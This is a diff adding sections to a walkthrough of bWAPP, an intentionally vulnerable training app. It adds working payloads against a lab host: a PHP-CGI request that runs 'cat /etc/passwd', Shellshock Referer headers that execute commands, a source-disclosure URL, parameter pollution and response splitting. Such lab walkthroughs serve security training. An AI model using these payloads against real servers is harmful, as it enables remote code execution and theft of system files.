@@ -451,6 +451,12 @@ Copy rfi.txt to rfi.php, it appears PHP automatically adds the suffix .php.
 bWAPP/rlfi.php?language=../evil/rfi
 ```
 
+### Restrict Device Access
+Modify request
+```
+User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19 
+```
+
 # A8 - Cross-Site Request Forgery (CSRF)
 
 Reference the HTML files in resources directory.  You can modify these to auto execute in a hidden iframe as an exercise.  If bWAPP had CSRF mitigations (such as utilization of tokens), then the POST requests made from the csrf_x.html files would respond with forbidden.
@@ -464,3 +470,47 @@ Please references [csrf_2.html](resources/csrf_2.html).  Again, replace the addr
 ### Cross-Site Request Forgery (Transfer Amount)
 Please references [csrf_3.html](resources/csrf_3.html).  Again, replace the address within the HTML with your own bWAPP server to change the secret.
 
+# A9 - Using Known Vulnerable Components
+
+### PHP CGI Remote Code Execution
+```
+POST /bWAPP/admin/phpinfo.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+Host: 192.168.1.20
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Length: 70
+Cookie: security_level=0; PHPSESSID=e27e4148fbb0b82028e1cd6e159f4e7a
+Connection: close
+
+<?php $r; exec('cat /etc/passwd', $r); echo implode($r, "\n"); die; ?>
+```
+
+There is also possibility to display source code
+```
+http://192.168.1.20/bWAPP/admin/phpinfo.php?-s
+```
+
+### Shellshock Vulnerability (CGI)
+Modify /bWAPP/cgi-bin/shellshock.sh request
+```
+Referer: () { nothing;}; /bin/touch /tmp/malicious
+```
+```
+Referer: () { nothing;}; echo; /bin/cat /etc/passwd
+```
+
+# Other bugs...
+
+### HTTP Paramter Pollution
+Put name
+```
+bee&movie=1
+```
+then every link will choose G.I Joe: Retaliation movie.
+
+### HTTP Response Splitting
+```
+http://192.168.1.20/bWAPP/http_response_splitting.php?url=http://itsecgames.blogspot.com%0AReferer%3agoogle.com
+```
